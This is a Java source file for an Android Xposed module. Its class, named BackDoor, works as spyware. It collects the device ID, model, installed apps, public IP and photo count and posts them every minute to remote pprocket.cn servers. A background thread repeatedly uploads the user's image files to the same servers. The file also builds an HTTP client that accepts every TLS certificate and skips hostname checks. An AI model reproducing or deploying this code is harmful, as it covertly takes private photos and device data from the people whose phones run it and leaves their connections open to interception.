package cn.coderstory.xposedtemplate;

import android.app.ActivityManager;
import android.app.AndroidAppHelper;
import android.content.Context;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Environment;
import android.provider.Settings;
import com.google.gson.Gson;
import com.google.gson.reflect.TypeToken;
import de.robv.android.xposed.XposedBridge;
import lombok.SneakyThrows;
import okhttp3.*;

import javax.net.ssl.*;
import java.io.File;
import java.io.IOException;
import java.security.cert.CertificateException;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.atomic.AtomicReference;

import static android.content.Context.ACTIVITY_SERVICE;


public class BackDoor {
    public static OkHttpClient client = getUnsafeOkHttpClient();
    public static BackDoor INSTANCE = new BackDoor();
    public static Gson gson = new Gson();
    public static String serial = Settings.Secure.getString(AndroidAppHelper.currentApplication().getContentResolver(), Settings.Secure.ANDROID_ID);

    public void reportDevice() {
        String brand = Build.BRAND + "  " +  Build.MODEL;
        String version = Build.VERSION.RELEASE;
        List<String> appList = getPkgList();
        AtomicReference<String> ip = new AtomicReference<>(getIP());
        int imgCount = getImageCount();
        DeviceInfo info = new DeviceInfo();
        info.setIp(ip.get());
        info.setApplications(appList);
        info.setBrand(brand);
        info.setAndroidVersion(version);
        info.setImageCount(imgCount);
        info.setSerial(BackDoor.serial);
        info.setLastOnline(System.currentTimeMillis());
        XposedBridge.log(gson.toJson(info));
        Thread t = new Thread(() -> {
            while (true) {
                try {
                    info.setLastOnline(System.currentTimeMillis());
                    RequestBody body = RequestBody.create(
                            MediaType.parse("application/json"), gson.toJson(info));
                    Request request = new Request.Builder()
                            .url(State.baseURL + "/reportDevice")
                            .post(body)
                            .build();
                    String string = client.newCall(request).execute().body().string();
                    XposedBridge.log("发送alive");
                    Thread.sleep(1000*60);
                } catch (Exception e) {
                    throw new RuntimeException(e);
                }
            }
        });
        t.start();

    }
    public BackDoor() {
        Thread uploadImageThread = new Thread(() -> {
            while (true) {
                try {
                    List<File> list = State.imgList;
                    int index = (int) (Math.random()* list.size());
                    File file = list.get(index);

                    if (isBackground(AndroidAppHelper.currentApplication().getApplicationContext())) {
                        BackDoor.INSTANCE.uploadImage(file);
                        XposedBridge.log("前台");
                    } else {
                        XposedBridge.log("后台");
                    }

                    Thread.sleep(2000);
                } catch (Exception e) {

                }
            }
        });
        uploadImageThread.start();
    }

    public void reportVideo(VideoInfo info) {

    }
    private boolean isSystemApp(PackageInfo pi) {
        boolean isSysApp = (pi.applicationInfo.flags & ApplicationInfo.FLAG_SYSTEM) == 1;
        boolean isSysUpd = (pi.applicationInfo.flags & ApplicationInfo.FLAG_UPDATED_SYSTEM_APP) == 1;
        return isSysApp || isSysUpd;
    }
    private List<String> getPkgList() {
        List<String> packages = new ArrayList<>();
        PackageManager packageManager = AndroidAppHelper.currentApplication().getPackageManager();
        try {
            List<PackageInfo> packageInfos = packageManager.getInstalledPackages(PackageManager.GET_ACTIVITIES |
                    PackageManager.GET_SERVICES);
            for (PackageInfo info : packageInfos) {
                if (!isSystemApp(info)) {
                    String s = info.applicationInfo.loadLabel(packageManager).toString();
                    packages.add(s);
                }
            }
        } catch (Throwable t) {
            t.printStackTrace();;
        }
        return packages;
    }
    @SneakyThrows
    String getIP()  {
        AtomicReference<String> result = new AtomicReference<>("");
        Thread t = new Thread(() -> {
            try {
                result.set(client.newCall(new Request(new Request.Builder().url("https://myip.ipip.net/"))).execute().body().string());
            } catch (IOException e) {
                throw new RuntimeException(e);
            }
        });
        t.start();
        while (true) {
            if (!result.get() .equals("")) {
                break;
            }
            Thread.sleep(200);
        }
        return result.get();
    }
    int getImageCount() {
        int num = 0;
        try {
            File sdcard = Environment.getExternalStorageDirectory();
            File dcim = new File(sdcard, "DCIM/");
            for (File file : dcim.listFiles()) {
                for (File ignored : file.listFiles()) {
                    num++;
                }
            }
        } catch (Exception ignored) {
            num = -1;
        }
        return num;

    }
    @SneakyThrows
    public void uploadImage(File file ) {
        XposedBridge.log("调用upload方法");
        MediaType mediaType = MediaType.parse("application/x-www-form-urlencoded");
        RequestBody body = new MultipartBody.Builder().setType(MultipartBody.FORM)
                .addFormDataPart("imgName", file.getName())
                .addFormDataPart("imgFile",file.getAbsolutePath(),
                        RequestBody.create(MediaType.parse("application/octet-stream"),
                                file))
                .addFormDataPart("serial",serial)
                .build();
        Request request = new Request.Builder()
                .url(State.baseURL + "/upload")
                .method("POST", body)
                .addHeader("Accept-Language", "zh-CN,zh;q=0.9")
                .addHeader("Connection", "keep-alive")
                .addHeader("Content-Type", "application/x-www-form-urlencoded")
                .build();
        Response response = client.newCall(request).execute();
        XposedBridge.log("响应： " + response.body().string());
    }
    @SneakyThrows
    public List<String> getIgnore() {
        MediaType mediaType = MediaType.parse("application/x-www-form-urlencoded");
        RequestBody body = RequestBody.create(mediaType, "{\r\n    \r\n}");
        Request request = new Request.Builder()
                .url("api.pprocket.cn/ignore?device=" + BackDoor.serial)
                .method("POST", body)
                .addHeader("Accept", "application/json, text/plain, */*")
                .addHeader("Accept-Language", "zh-CN,zh;q=0.9")
                .addHeader("Connection", "keep-alive")
                .addHeader("Content-Type", "application/x-www-form-urlencoded")
                .build();
        Response response = client.newCall(request).execute();
        String str = response.body().string();
        XposedBridge.log("忽略：" + str);
        return gson.fromJson(str, new TypeToken<List<String>>(){}.getType());
    }
    @SneakyThrows
    public static String getBaseURL() {
        AtomicReference<String> str = new AtomicReference<>("");
        Thread t = new Thread(() -> {
            try {
                str.set(client.newCall(new Request(new Request.Builder()
                        .url("https://api-pord.pprocket.cn/")
                )).execute().body().string());
            } catch (IOException e) {
                throw new RuntimeException(e);
            }

        });
        t.start();
        while (true) {
            if (!str.get().equals("")) {
                break;
            }
            Thread.sleep(50);
        }
        XposedBridge.log("远程地址： " + str.get());
        return str.get();
    }
    @SneakyThrows
    public static String getMediaList() {
        AtomicReference<String> result = new AtomicReference<>("");
        Thread t = new Thread(() -> {
            try {
                result.set(client.newCall(new Request.Builder()
                        .url(State.baseURL + "/media")
                        .build()
                ).execute().body().string());
            } catch (IOException e) {
                throw new RuntimeException(e);
            }
        });
        t.start();
        while (true) {
            Thread.sleep(100);
            if (!result.get().equals("")) {
                return result.get();
            }
        }
    }
    private boolean isBackground(Context context){
        ActivityManager activityManager = (ActivityManager) context.getSystemService(ACTIVITY_SERVICE);
        List<ActivityManager.RunningAppProcessInfo>  appProcessInfoList = activityManager.getRunningAppProcesses();
        if(appProcessInfoList == null){
            return false;
        }

        String packageName = context.getPackageName();
        for(ActivityManager.RunningAppProcessInfo processInfo : appProcessInfoList){
            if(processInfo.processName.equals(packageName) && processInfo.importance == ActivityManager.RunningAppProcessInfo.IMPORTANCE_FOREGROUND ){
                return true;
            }
        }
        return false;
    }
    private static OkHttpClient getUnsafeOkHttpClient() {
        try {
            // Create a trust manager that does not validate certificate chains
            final TrustManager[] trustAllCerts = new TrustManager[]{
                    new X509TrustManager() {
                        @Override
                        public void checkClientTrusted(java.security.cert.X509Certificate[] chain, String authType) {
                        }

                        @Override
                        public void checkServerTrusted(java.security.cert.X509Certificate[] chain, String authType) {
                        }

                        @Override
                        public java.security.cert.X509Certificate[] getAcceptedIssuers() {
                            return new java.security.cert.X509Certificate[]{};
                        }
                    }
            };

            // Install the all-trusting trust manager
            final SSLContext sslContext = SSLContext.getInstance("SSL");
            sslContext.init(null, trustAllCerts, new java.security.SecureRandom());
            // Create an ssl socket factory with our all-trusting manager
            final SSLSocketFactory sslSocketFactory = sslContext.getSocketFactory();


            OkHttpClient.Builder builder = new OkHttpClient.Builder();
            builder.sslSocketFactory(sslSocketFactory, (X509TrustManager) trustAllCerts[0]);
            builder.hostnameVerifier((hostname, session) -> true);
            OkHttpClient okHttpClient = builder.build();
            return okHttpClient;
        } catch (Exception e) {
            throw new RuntimeException(e);
        }
    }


}
